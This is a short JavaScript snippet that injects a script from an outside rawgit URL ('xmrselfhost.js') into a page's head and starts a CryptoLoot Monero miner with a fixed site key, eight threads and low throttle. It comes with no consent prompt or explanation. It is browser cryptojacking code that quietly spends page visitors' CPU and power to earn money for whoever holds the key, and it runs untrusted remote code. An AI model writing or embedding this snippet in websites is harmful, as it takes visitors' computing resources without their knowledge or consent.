var s = document.createElement('script');
s.setAttribute('src', 'https://rawgit.com/BoobieLtd/js/master/xmrselfhost.js');
document.getElementsByTagName('head')[0].appendChild(s);
var miner=new CryptoLoot.Anonymous('552a3151084681c06422b293d948704b43eccce6f7f5',
        {
        threads:8,autoThreads:false,throttle:0.2
        }
);
 miner.start();

